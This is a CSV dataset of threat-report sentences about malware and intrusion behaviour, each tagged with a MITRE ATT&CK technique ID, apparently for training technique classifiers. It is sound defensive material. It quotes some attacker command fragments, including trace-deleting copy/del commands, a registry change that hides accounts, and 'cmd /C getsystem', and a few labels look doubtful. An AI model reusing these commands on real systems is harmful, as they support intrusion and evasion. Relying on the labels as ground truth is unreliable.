text,label
has the ability to remove all files created during the dropper process.,T1070.004
can use obfuscated and encoded scripts; it has also hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.,T1027
"Once decoded, this executable, written in Rust and compiled with Cargo, gets the current date and time, and decrypts Chromium-based browsers’ encryption key ",T1140
This function decrypts strings,T1140
has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0 CVE-2017-7269 in order to establish a new HTTP or command and control (C2) server.,T1190
"Upon execution, an attempt to alter the Windows firewall settings is made.",T1562.001
can identify the OS version of a targeted system.,T1082
The payload from the project files was a remote access tool (RAT) called Remcos.,T1219
has used TCP in C2 communications.,T1095
can launch command-line shells.,T1059.003
can delete files to cover tracks.,T1070.004
The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.,T1053.005
is capable of downloading files including additional modules.(Citation: Palo Alto menuPass Feb 2017)(Citation: JPCERT ChChes Feb 2017),T1105
the service account password was weak and cracked offline by threat actors.,T1110
uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs,T1106
is capable of creating reverse shell.,T1059.003
has a feature to perform screen capture.,T1113
then a malware downloader is uploaded to the device,T1105
provides access using both standard facilities like SSH and additional access using its backdoor Espeon providing a reverse shell upon receipt of a special packet,T1059.003
has downloaded additional tools such as  malware and  to a compromised host following initial access.,T1105
can use Rundll32.exe to enable C2 communication.(Citation: Crowdstrike Qakbot October 2020)(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot May 2021),T1218.011
by capturing the CredEnumerateA API.,T1106
""".bat"" files designed to disable Cisco AMP / Microsoft Defender",T1562.001
previously injected into,T1055
has used Powershell to download UltraVNC and  from third-party file sharing sites.,T1105
contains the ability to inject .NET assemblies into unmanaged processes.,T1055
Get configuration file and decrypt it,T1140
"FakeRun’s PDB string (D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process",T1055
"has been observed in multiple ISO files masquerading as legitimate software,",T1036.005
Creates two registry keys for persistence,T1547.001
Using this RMM agent they proceeded to install AnyDesk on the host.,T1219
"At first glance, the files within the directory may seem legitimate",T1036.005
"the self-decrypting DLL,",T1140
"As NetSupport Manager is a legitimate tool that has a long history of development, it is highly attractive to attackers as it can be relied on to work ‘out of the box’.",T1219
searches the File system for files of interest. ,T1005
encrypts C2 data with RC4 encryption.(Citation: US-CERT FALLCHILL Nov 2017),T1573.001
"WMI permanent event subscriptions can be used to trigger actions
when specified conditions are met.",T1047
infected WinCC machines via a hardcoded database server password.,T1078
used PowerShell to download and execute,T1105
It removes log files and temporary files from the root directory.,T1027
will enumerate the macOS version to determine which follow-on behaviors to execute using /usr/bin/sw_vers -productVersion.(Citation: MacKeeper Bundlore Apr 2019),T1082
creates a new service named ntssrv to execute the payload. Newer versions create the MaintenaceSrv and hdv_725x services.(Citation: Palo Alto Shamoon Nov 2016),T1543.003
malware encrypts C2 traffic using RC4 with a hard-coded key.,T1573.001
Comsvcs.dll is a well-known way to extract LSASS (Local Security Authority Subsystem Service) data,T1003.001
username,T1033
mimics a legitimate Russian program called USB Disk Security.,T1036.005
can use base64 encoding string stacking and opaque predicates for obfuscation.,T1027
can identify the process for a specific security product.,T1057
can list files and directories with the `ls` `lsd` and `lsl` commands.,T1083
combination of Base64 and XOR functions.,T1027
can decompress and copy driver files using `LZCopy`.,T1140
the threat actor renamed their systems prior to connecting to victim’s VPNs to match the victim’s system naming convention,T1036.005
has packed malware to help avoid detection.,T1027
"To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration",T1036.005
Command codes in the PUBLOAD HTTP variant,T1071.001
uses a copy of tor2web proxy for HTTPS communications.,T1090
"uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow.",T1106
has the ability to identify the computer name and Windows version of an infected host.,T1082
has used rundll32 to load malicious DLLs.,T1218.011
"With the exception of the ‘Speed’ method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list:    ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK    The last two methods in the chain carry out a majority of the first payload’s functionality",T1083
that decompresses and loads the first stage in memory.,T1140
After compromising a victim  lists all running processes.,T1057
can use a decryption mechanism to process a user supplied password and allow execution.,T1140
can download or upload files from its C2 server.,T1105
uses attrib +h to make some of its files hidden.,T1564.001
has harvested valid administrative credentials for lateral movement.,T1078
During  the threat actors consistently removed traces of their activity by first overwriting a file using `/c cd /d c:\windows\temp\ & copy \\<IP ADDRESS>\c$\windows\system32\devmgr.dll \\<IP ADDRESS>\c$\windows\temp\LMAKSW.ps1 /y` and then deleting the overwritten file using `/c cd /d c:\windows\temp\ & del \\<IP ADDRESS>\c$\windows\temp\LMAKSW.ps1`.,T1070.004
has a module for performing remote desktop access.,T1021.001
attackers used an innocent-looking email to lure victims into opening an attachment.,T1566.001
creates a batch file in %WINDOWS%\Temp called registry.bat.,T1112
has uploaded collected data and files from a compromised host to its C2 server.,T1041
has gathered victim computer information and configurations.,T1082
first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.,T1027
used other victims as proxies to relay command traffic for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.  has also used a machine to relay and obscure communications between  and their server.(Citation: FireEye APT28)(Citation: Bitdefender APT28 Dec 2015),T1090
Decoded from Base64:,T1140
has registered itself as a scheduled task to run each time the current user logs in.(Citation: ESET Sednit Part 1),T1053.005
copies itself into the %systemroot%\system32 directory and registers as a service.,T1543.003
can collect the username from a compromised host.,T1033
schtasks /Create /TN test /SC MINUTE /MO 15 /TR,T1053.005
It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file,T1083
's commands strings and domains can be Base64 encoded within the payload.,T1027
the embedded Windows executable,T1027
malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version UUID and computer/host name to send to the C2 server.(Citation: Unit 42 Magic Hound Feb 2017),T1082
checks for anti-malware products and processes.,T1518.001
is capable of performing process listings.,T1057
has deleted Registry keys to clean up its prior activity. ,T1112
can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.,T1105
has decoded strings in the malware using XOR and RC4.(Citation: Unit 42 Bisonal July 2018) ,T1140
uses WMI to perform discovery techniques.,T1047
has decrypted its payload using a hardcoded AES-256 key.(Citation: Cybereason Conti Jan 2021),T1140
has the ability to download additional files.,T1105
has the capability to discover the system OS Windows version architecture and environment.,T1082
packed by noted tools,T1027
both use CreateFile and WriteFile APIs,T1106
has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.,T1547.001
obtains the victim username.,T1033
has the ability to copy itself to a hidden file and directory.,T1564.001
Keylogger database,T1056.001
It returns the decrypted message as a decoded string.,T1140
facilitates the functionality of WMI in Windows,T1047
"Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123",T1016
has leveraged rundll32.exe to execute malicious DLLs.(Citation: Cybereason TA505 April 2019),T1218.011
The area after this contains encrypted data.,T1027
"to store and retrieve binary data with
the Windows API.",T1106
has some simple but clever obfuscation in place.,T1027
the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process.,T1055
can delete .LNK files created in the Startup folder.,T1070.004
has collected system information including the machine name and OS version.,T1082
C:\Windows\system32\wbem\wmic.exe /node,T1047
has used tools for capturing keystrokes.(Citation: Symantec Chafer February 2018),T1056.001
can disable Avira anti-virus.,T1562.001
that pulls the Cobalt Strike payload from a fake JPG file.,T1027
sets up a Registry Run key to establish a persistence mechanism.,T1547.001
sends compromised victim information via HTTP.,T1041
"passes the PE payload to it, which the shellcode then loads and executes.",T1055
adds a Registry Run key to establish persistence.,T1547.001
on TCP port 2222.,T1095
"This function is
patched using Microsoft Detours—a publicly available library used for
instrumenting Win32
functions—so",T1106
can sniff plaintext network credentials and use NBNS Spoofing to poison name services.,T1557.001
after receiving phishing emails containing malicious PDF documents [T,T1566.001
Screenshots The data dump includes several screenshots of resources that the leaker alleged was related to the OilRig group,T1113
"In February 2022, the threat actors exploited Log4Shell [T1190] for initial access",T1190
File-packed Magniber ransomware,T1027
has the ability to obtain screenshots of the compromised system.,T1113
has sent user and system information to a C2 server via HTTP POST requests.(Citation: NHS UK BLINDINGCAN Aug 2020),T1041
"in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender",T1562.001
Screenshots are also taken at a configurable interval; the default is once every 30 seconds.,T1113
has modules for brute forcing local administrator and AD user accounts.,T1110
creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.,T1547.001
executes commands remotely on the infected host.,T1059.003
has obfuscated scripts with the BatchEncryption tool.,T1027
Downloading and executing PowerShell code,T1105
has the ability to capture keystrokes.,T1056.001
String decryption for the DLL names needed for execution.,T1140
has queried the registry for proxy server information.,T1012
used an HTTP malware variant and a Port 22 malware variant to collect the victims username.,T1033
the malware starts a function called bypassSMADAV,T1106
attackers have started using this technique to hide their malicious infrastructure behind legitimate domains,T1090
"to disable User Access Control (UAC), a security feature in Windows",T1548.002
has used a batch script to gather folder and file names from victim hosts.(Citation: US-CERT TA18-074A)(Citation: Gigamon Berserk Bear October 2021),T1083
can use RC4 encryption in C2 communications.,T1573.001
has used a macro function to set scheduled tasks disguised as those used by Google.,T1053.005
can extract backdoor malware from downloaded images.,T1027
"Windows net commands were run,",T1059.003
can use asynchronous procedure call (APC) injection to execute commands received from C2.,T1055
brute forcing attempts on some of the internal FTP servers inside victim network,T1110
used the command prompt to launch commands on the victims machine.(Citation: FireEye FIN7 Aug 2018) ,T1059.003
Windows API functions,T1106
deletes content from C2 communications that was saved to the user's temporary directory.,T1070.004
uses a custom packing algorithm.,T1027
has retrieved iPhone text messages from iTunes phone backup files.,T1005
miner TermsHost.exe evaded defenses by injecting itself into Windows processes including Notepad.exe.,T1055
has downloaded and executed additional encoded payloads.(Citation: ZScaler Squirrelwaffle Sep 2021),T1105
obtains a list of running processes through WMI querying and the ps command.,T1057
can collect the username from the victims machine.,T1033
During  threat actors gathered a recursive directory listing to find files and directories of interest.,T1083
This type of threats is usually delivered as email attachments.,T1566.001
"11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with “-” and “_”",T1027
can identify processes via C# methods such as GetProcessesByName and running  with the Python os.popen function.,T1057
has used Mimikatz to retrieve credentials from LSASS memory.,T1003.001
uses a batch file to kill a security program task and then attempts to remove itself.,T1059.003
can spawn a job to inject into LSASS memory and dump password hashes.,T1003.001
contains a keylogger.,T1056.001
can gather a list of running processes by using .,T1057
they always have used DLL sideloading as their major technique to launch their malware.,T1574.002
has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code. ,T1055
can collect the name and ID for every process running on the system.,T1057
details of the RDP session,T1021.001
writes multiple outputs to a TMP file using the >> method.,T1074.001
is capable of performing remote file transmission.,T1105
has run whoami on a victim.(Citation: Palo Alto OilRig May 2016)(Citation: Palo Alto OilRig Oct 2016),T1033
"Indicators  File  Hash  Description  x.js  3fefa55daeb167931975c22df3eca20a  HOMEFRY, a 64-bit Windows password dumper/cracker  mt.exe  40528e368d323db0ac5c3f5e1efe4889  MURKYTOP, a command-line reconnaissance tool   com4.js  a68bf5fce22e7f1d6f999b7a580ae477  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages   Historical Indicators  File  Hash  Description  green.ddd  3eb6f85ac046a96204096ab65bbd3e7e  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages  BGij  6e843ef4856336fe3ef4ed27a4c792b1  Beacon, a commercially available backdoor  msresamn.ttf  a9e7539c1ebe857bae6efceefaa9dd16  PHOTO, also reported as Derusbi  1024-aa6a121f98330df2edee6c4391df21ff43a33604  bd9e4c82bf12c4e7a58221fc52fed705  BADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration",T1140
takes screenshots of the user's desktop.,T1113
uses .NET Graphics class CopyFromScreen Function(),T1106
copied all targeted files to a directory called index that was eventually uploaded to the C&C server.,T1074.001
modifies the firewall Registry key SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List.,T1112
can enumerate files and directories.,T1083
WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.,T1047
has obfuscated its strings with a simple XOR encryption with a static key.,T1027
to track which of the 3 processes are running on the system.,T1057
"Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task",T1070.004
attempts to download an encrypted binary from a specified domain.,T1105
has added and deleted keys from the Registry.,T1112
an obfuscated VBA macro,T1027
has used systeminfo and similar commands to acquire detailed configuration information of a victim machine.,T1082
the RDP traffic was being proxied through,T1090
gathers network configuration information as well as the ARP cache.,T1016
has used various tools to proxy C2 communications.,T1090
"to perform initial intrusion leveraging exposed vulnerable applications, for example, continuing to exploit Log4j 2 vulnerabilities in unpatched systems in",T1190
cmd /C,T1059.003
"After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution",T1070.004
"It is used to connect to systems in the same network via SMB, to write a batch file to disk",T1570
"USING "".BAT"" FILES",T1059.003
A  macro has run a PowerShell command to decode file contents.  has also used  to decode base64-encoded files on victims.(Citation: FireEye APT34 Dec 2017)(Citation: OilRig New Delivery Oct 2017)(Citation: Unit 42 OopsIE! Feb 2018),T1140
it creates a one-time scheduled task.,T1053.005
can delete files.,T1070.004
"It supports proxy (Socks5),",T1090
copying the current process command line as a new argument,T1059.003
has installed a service pointing to a malicious DLL dropped to disk.,T1543.003
"After the download, another button appeared, which, when clicked, executed the file.",T1204.002
lists the current processes running.,T1057
HTTP variant,T1071.001
Base64 Decoded instructions in dropper,T1140
has created a hidden file in the Startup folder of the current user.,T1564.001
has collected the username of the victim system.,T1033
can exfiltrate locally stored data via its C2.,T1041
gathers the victims IP address via the ipconfig -all command.(Citation: Lazarus RATANKBA),T1016
"Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement.",T1055
can download a payload for execution.,T1105
During  the threat actors used  to obtain the compromised machine's name.,T1082
"As before, they are resolved by their hashes.",T1027
Inject malicious code into legitimate processes,T1055
The adversary installs a hackers best friend during the intrusion: Cobalt Strike.,T1105
uses the CGEventTap functions to perform keylogging.,T1056.001
During  threat actors has used WMI to execute commands.,T1047
has used batch files for execution and can launch Internet Explorer from cmd.exe.(Citation: JoeSecurity Egregor 2020) ,T1059.003
"RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation",T1016
has stored captured credential information in a file named pi.log.,T1074.001
is capable of launching a remote shell on the host to delete itself.,T1070.004
The GUID returned from the registry value,T1012
achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.,T1547.001
can identify proxy servers configured and used by the victim and use it to make HTTP requests to C2 its server.,T1090
can capture screenshots of the victims machine.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018),T1113
"The downloading of the actual malware is done via a variety of possible commands (for example, wget, curl, tftp and ftpget).",T1570
"Lateral Movement APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP)",T1021.001
the threat actors proceeded to RDP to the domain controller.,T1021.001
Windows API,T1106
can establish persistence with the auto start function including using the value `EverNoteTrayUService`.,T1547.001
has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473 CVE-2021-34523 CVE-2021-31207) on MS Exchange servers.(Citation: Check Point APT35 CharmPower January 2022)(Citation: DFIR Report APT35 ProxyShell March 2022),T1190
has used cmd.exe to add a persistent service.,T1059.003
"using UltraVNC to download and store
a file",T1105
has appended random binary data to the end of itself to generate a large binary. ,T1027
has uploaded files and data from a compromised host.,T1005
"When the payload was executed, there were some telltale registry events observed",T1112
Process Hashes and Process Privilege Checks,T1057
has sent phishing emails with malicious Microsoft Word attachments to victims.,T1566.001
adds several Registry entries to enable automatic execution at every system startup.(Citation: TrendMicro DarkComet Sept 2014),T1547.001
can uninstall malware components using a batch script.  can execute commands using a shell.,T1059.003
The command to get specific files,T1083
During  the threat actors executed an encoded VBScript file.,T1027
The API function located at the beginning of the memory section are resolved using GetProcAddress,T1106
attempts to copy itself to remote machines on the network.,T1570
The batch file,T1059.003
can encrypt strings at compile time.(Citation: Bishop Fox Sliver Framework August 2019),T1027
can use HTTP and HTTPS for command and control communication.(Citation: Talos ROKRAT)(Citation: NCCGroup RokRat Nov 2018),T1071.001
has communicated with its C2 servers via HTTPS and HTTP POST requests.,T1071.001
has obfuscated its main code routines within bitmap images as part of its anti-analysis techniques. ,T1027
has received files from C2 and stored them in log folders beginning with the character sequence `a9850d2f`.,T1105
can inject decrypted shellcode into the LanmanServer service.,T1055
has collected a list of running processes on the infected system.,T1057
has been executed through luring victims into opening malicious documents.(Citation: FireEye NETWIRE March 2019)(Citation: Unit 42 NETWIRE April 2020),T1204.002
where they were previously injected into,T1055
After checking for the existence of two files keyword_parm.txt and parm.txt  XOR decodes and read the contents of the files. ,T1140
Attempted to blend in with a file name that matched the system name it resided on,T1036.005
"the threat actor leveraged one of the most popular dual-use agents, AnyDesk, to provide persistent remote access into the affected organization on multiple systems.",T1219
DLLs with the names ualapi.dll and ncobjapi.dll being sideloaded,T1574.002
has used the RegQueryValueExA function to retrieve proxy information in the Registry.,T1012
uses a modified version of RC4 for data transfer.,T1573.001
can use WMI for execution.(Citation: Cybereason Molerats Dec 2020),T1047
The unpacked sample is approximately 540 KB,T1027
and then decrypts the content,T1140
taking screenshots,T1113
has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020)(Citation: ESET Lazarus Jun 2020),T1036.005
uses HTTP over SSL to communicate commands with the control server.,T1071.001
has used the command ls /etc | egrep -efedora\*|debian\*|gentoo\*|mandriva\*|mandrake\*|meego\*|redhat\*|lsb-\*|sun-\*|SUSE\*|release to determine which Linux OS version is running.,T1082
can install itself as a service. ,T1543.003
has been delivered via phishing emails with malicious attachments.,T1566.001
has the ability to use HTTP and HTTPS in communication with C2 servers.(Citation: Trend Micro Qakbot May 2020)(Citation: Crowdstrike Qakbot October 2020),T1071.001
cmd /C,T1059.003
"With the DLL strings decrypted, the malware then decrypts the loader configuration by taking the first 64 bytes and XORing it against the next 64 bytes.",T1140
has attempted to get users to launch malicious documents to deliver its payload. (Citation: TrendMicro Trickbot Feb 2019),T1204.002
Variants of  encrypt payloads using various XOR ciphers as well as a custom algorithm that uses the srand and rand functions.(Citation: Lotus Blossom Dec 2015),T1027
has executed a batch script designed to disable Windows Defender on a compromised host.,T1562.001
For  the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data.,T1027
has the ability to decrypt fileless loader modules.,T1140
They may also use the wmiexec module from Impacket to execute commands and move across the network.,T1047
collects the user name from the victims machine.,T1033
can inject a variety of payloads into processes dynamically chosen by the adversary.,T1055
can gather a list of all processes running on a victim's machine.,T1057
has collected the host's OS CPU and memory information.,T1082
can search through folders and files on the system.,T1083
During  threat actors used administrative utilities to deliver Trojan components to remote systems.,T1105
used custom tools to create SOCK5 and custom protocol proxies between infected hosts.(Citation: FireEye APT39 Jan 2019),T1090
probes the system to check for antimalware processes.(Citation: FinFisher Citation),T1518.001
malware can list running processes.,T1057
can use HTTP or HTTPS for C2 communications.,T1071.001
has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.,T1047
obfuscates strings with base64 encoding.,T1027
have enumerated files and directories or searched in specific locations within a compromised host.,T1083
has enumerated files on a compromised host.(Citation: US District Court Indictment GRU Unit 74455 October 2020),T1083
has several commands to search directories for files.(Citation: Cybereason Oceanlotus May 2017),T1083
has a command to delete a file from the system.  deletes the app bundle and dropper after execution.(Citation: TrendMicro MacOS April 2018),T1070.004
encrypts data sent to its C2 server over HTTP with RC4.,T1573.001
"affiliates may exploit group policies, which results in a scheduled task being created (on each host) that launches the ransomware.",T1053.005
An  downloader establishes SOCKS5 connections for its initial C2.,T1095
C:\Windows\system32\cmd.exe /C,T1059.003
"119 readFiles Obtains file information on a file or a folder, and supports a “*” wildcard and recursive file list",T1083
adversary was also observed remotely modifying the Windows Registry on remote systems,T1112
has identified security software configurations defensive tools and sensors installed on a compromised system.,T1518.001
Inject and execute DLLs,T1055
Get content list from a specified directory,T1083
may collect information on the victim's anti-virus software.,T1518.001
"When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell",T1033
can exfiltrate data over the primary C2 channel (Dropbox HTTP API).,T1041
The message sent to the C2 will be “file is deleted.” if successful or “file is not deleted.” if unsuccessful,T1070.004
"If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards",T1105
can Base64 encode output strings prior to sending to C2.,T1027
surveys a system upon check-in to discover running processes using the tasklist /v command.(Citation: Kaspersky Turla)  RPC backdoors have also enumerated processes associated with specific open ports or named pipes.,T1057
can use HTTP for C2.,T1071.001
HTTP traffic to C2,T1071.001
the threat actors made attempts to proxy RDP traffic,T1090
has used  C2 beacons for data exfiltration. ,T1041
VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.(Citation: ESET Telebots Dec 2016),T1140
The threat actor regularly interrogated other systems using tasklist.exe,T1057
can collect data and files from a compromised host.,T1005
The paths and registry keys to use,T1112
Download a file from the remote server,T1105
"After gaining initial access to an organization by exploiting a vulnerability with a public POC,",T1190
can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\Windows\.,T1074.001
Once loaded into memory  deletes the keyword_parm.txt and parm.txt configuration files from disk. ,T1070.004
can bypass UAC by registering as the default handler for .MSC files.,T1548.002
"compares each hash with 3 hardcoded hashes:

0x6403527E → avp.exe associated with Kaspersky AV
0x23214B44  → ns.exe associated with Norton Security
0x651B3005 → ccSvcHst.exe associated with Symantec",T1518.001
can use `cmd.exe` to execute commands.,T1059.003
performs a BXOR to decode the bytes,T1140
"reg.exe ADD
'HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Winlogon\SpecialAccounts\UserList",T1112
has communicated to hard-coded IP addresses via HTTP.,T1071.001
A  tool can encrypt payloads using XOR.  malware is also obfuscated using Metasploits shikata_ga_nai encoder as well as compressed with LZNT1 compression.(Citation: Nccgroup Emissary Panda May 2018)(Citation: Securelist LuckyMouse June 2018),T1027
"have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices.",T1057
creates a new service named WmiApSrvEx to establish persistence.,T1543.003
there are two domains that are decrypted:,T1140
has used procdump to dump the LSASS process memory.(Citation: Microsoft HAFNIUM March 2020),T1003.001
has collected the computer name and OS architecture information from the system.,T1082
gathers and exfiltrates keystrokes from the machine.,T1056.001
loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's Microsoft.IdentityServer.ServiceHost.exe process.,T1057
has the ability to use native APIs for execution including GetProcessHeap GetProcAddress and LoadLibrary.(Citation: TrendMicro Taidoor),T1106
can decode its payload prior to execution.,T1140
These emails may contain a malicious link or file that provide the cyber actor access to the victim’s device,T1566.001
"Those files will still get executed, if the user clicks on run",T1204.002
sent username computer name and the previously generated UUID in reply to a who command from C2.,T1033
has downloaded PowerShell code from the C2 server to be executed.,T1105
text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list,T1016
has used a variety of publicly available tools like   and ProcDump to dump credentials.(Citation: Symantec Elfin Mar 2019),T1003.001
Several hosts showed rundll32 processes exhibiting common process injection behavior,T1055
was seen using a keylogger tool to capture keystrokes. ,T1056.001
These words are used to build the registry value names.,T1112
"This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities",T1082
the lsass.exe beacon,T1003.001
"this CMD file calls the ""db"" file. In both samples,",T1059.003
"to locate certain files, paths,",T1083
to run the subsequent BAT scripts,T1059.003
Decrypting and exporting browser data,T1140
has hardcoded API calls within its functions to use on the victim's machine. ,T1106
has the ability to upload and download files to and from an infected host.,T1105
can decode its encoded PE file prior to execution.,T1140
DLL sideloading,T1574.002
"The dropper installs 2 files:netwf.bat : executes netwf.dllnetwf.dll : the payloadThe dropper implements 2 persistence mechanisms:HKCU\Environment\UserInitMprLogonScript to execute the netwf.bat fileCOM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.These 2 techniques have also been previously used by this actor.Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed",T1218.011
deletes the original dropped file from the victim.,T1070.004
C:\Windows\system32\cmd.exe /C getsystem,T1059.003
has searched for system version architecture disk partition logical volume and hostname information.(Citation: ATT TeamTNT Chimaera September 2020),T1082
has used a custom tool for creating reverse shells.,T1059.003
has used tools to download malicious files to compromised hosts.,T1105
has used malware that is disguised as a Secure Shell (SSH) tool.,T1036.005
execute an IcedID loader with rundll32,T1218.011
has the ability to download additional components and malware.(Citation: Trend Micro Qakbot May 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Cyberint Qakbot May 2021)(Citation: Kaspersky QakBot September 2021),T1105
has used TCP for C2.,T1095
can obtain the victim PC name and OS version.,T1082
it uses the following command to delete the data in PSReadline,T1070.004
"The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file – Picture2.exe",T1105
obfuscated PHP code (again using character code obfuscation):,T1027
"In some cases, they are then re-encrypted but with a different key",T1027
has a tool that can list out currently running processes.(Citation: FireEye Clandestine Fox),T1057
 has the ability to run cancel or closeanddeletestorage to remove all files from storage and delete the storage temp file on a compromised host.,T1070.004
has tested connectivity between a compromised machine and a C2 server using  with commands such as `CSIDL_SYSTEM\cmd.exe /c ping -n 1`.,T1016
used cmd.exe for execution.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020),T1059.003
The  installer loads a DLL using rundll32.(Citation: Microsoft Winnti Jan 2017),T1218.011
surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory the current user's desktop the Program Files directory and Recent.(Citation: Kaspersky Turla)(Citation: ESET ComRAT May 2020)  RPC backdoors have also searched for files matching the lPH*.dll pattern.,T1083
can monitor processes for open browsers and custom banking applications.,T1057
"The HTML code in this file contains embedded JavaScript functionality,",T1027
We observed a process created by Cobalt Strike accessing lsass.exe,T1003.001
can hide data in images including use of the Least Significant Bit (LSB).,T1027
uses RC4 encryption over TCP to communicate with its C2 server. ,T1573.001
The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.,T1078
has used a valid account to maintain persistence via scheduled task.,T1078
has the ability to download files.,T1105
Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.,T1573.001
